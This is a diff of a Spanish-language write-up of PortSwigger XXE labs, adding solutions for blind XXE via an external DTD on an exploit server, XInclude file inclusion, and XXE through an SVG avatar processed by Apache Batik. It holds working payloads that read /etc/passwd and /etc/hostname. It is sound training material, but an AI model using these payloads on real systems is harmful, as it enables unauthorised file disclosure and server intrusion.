@@ -10,15 +10,15 @@ Este laboratorio tiene una funcionalidad de **"Check stock"** que **analiza entr
 
 Accedemos a la petición tras comprobar el stock y la mandamos al **Repeater**.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tiene contenido en **XML** que vamos a cambiar. Vamos a poner una etiqueta ya que no comprueba este tipo de inyección.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Cambiamos el contenido para que se nos imprima el **/etc/passwd**.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: Exploiting XXE to perform SSRF attacks
 
@@ -34,19 +34,19 @@ Este endpoint puede usarse para obtener información sobre la instancia, incluye
 
 Comprobamos lo del anterior laboratorio si se puede inyectar código XML.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sí se puede por lo que ahora lo modificamos así.
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al enviarlo nos devuelve latest que puede ser un directorio en el que vamos a ir indagando hasta encontrar las credenciales.
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Y así todo el rato hasta las credenciales.
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: Blind XXE with out-of-band interaction
 
@@ -161,3 +161,107 @@ Finalmente, abrimos Burp Collaborator o revisa tu servidor para ver la petición
 <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 190702.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-09 190733.png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Exploiting blind XXE to retrieve data via error messages
+
+### Enunciado
+
+Este laboratorio tiene una función "Check stock" que analiza (parsea) entradas en formato XML pero no muestra el resultado.
+
+Para resolver el laboratorio, utiliza un DTD externo para provocar un mensaje de error que muestre el contenido del archivo /etc/passwd.
+
+El laboratorio incluye un enlace a un servidor de explotación (exploit server) en un dominio diferente, donde puedes alojar tu DTD malicioso.
+
+### Resolución
+
+Vemos la petición de stock.
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Como no sale el error estamos en una inyección a ciegas XXE. Para explotar esto, podemos provocar un error de análisis XML, de manera que el mensaje de error incluya datos sensibles, como el contenido de **/etc/passwd**.
+
+En el laboratorio, contamos con un servidor de explotación (exploit server) que nos permite alojar un DTD externo malicioso
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a84005704bd670e808b5c9b0112003d.exploit-server.net/exploit"> %xxe;]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Exploiting XInclude to retrieve files
+
+### Enunciado
+
+Este laboratorio tiene una función “Check stock” que inserta la entrada del usuario dentro de un documento XML en el servidor y luego la analiza. Como no controlas todo el documento XML, no puedes definir un DTD para hacer un ataque XXE clásico.
+
+Para resolver el laboratorio, inyecta una instrucción XInclude para obtener el contenido del archivo /etc/passwd.
+
+### Resolución
+
+Vemos la petición de stock.
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Esta vez, sin embargo, no vemos ningún dato XML. En algunas aplicaciones, los datos enviados por el cliente se reciben y se insertan en el servidor dentro de un documento XML, que luego se analiza.
+
+Si la entrada del usuario no se sanitiza bien, puede ser vulnerable a inyección XXE usando XInclude.
+
+XInclude es parte de la especificación XML que permite construir un documento XML a partir de subdocumentos. Podemos colocar un ataque de XInclude en cualquier valor de datos en un documento XML, por lo que se puede realizar incluso cuando solo controlas un dato individual que se inserta en el XML del servidor.
+
+Para realizar un ataque XInclude, necesitas referenciar el namespace de XInclude y dar la ruta al archivo que quieres incluir. Por ejemplo:
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+Con esta información, podemos enviar el siguiente payload:
+
+```
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+## Lab: Exploiting XXE via image file upload
+
+### Enunciado
+
+Este laboratorio permite a los usuarios adjuntar avatares a los comentarios y usa la biblioteca Apache Batik para procesar los archivos de imagen del avatar.
+
+Para resolver el laboratorio, sube una imagen que, al ser procesada, muestre el contenido del archivo `/etc/hostname`.
+
+Luego, usa el botón "Submit solution" para enviar el valor del nombre del host del servidor.
+
+### Resolución
+
+En la sección de comentarios podemos subir un avatar. El enunciado indica que se usa la biblioteca Apache Batik para procesar archivos de imagen del avatar. Esto sugiere que podemos subir una imagen SVG, que es un formato basado en XML y vulnerable a XXE.
+
+Con esta información, podemos crear un archivo SVG con un payload XXE para extraer datos del servidor.
+
+{% embed url="https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/" %}
+
+```
+<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Abrimos la imagen en una nueva ventana.
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1570).png" alt=""><figcaption></figcaption></figure>
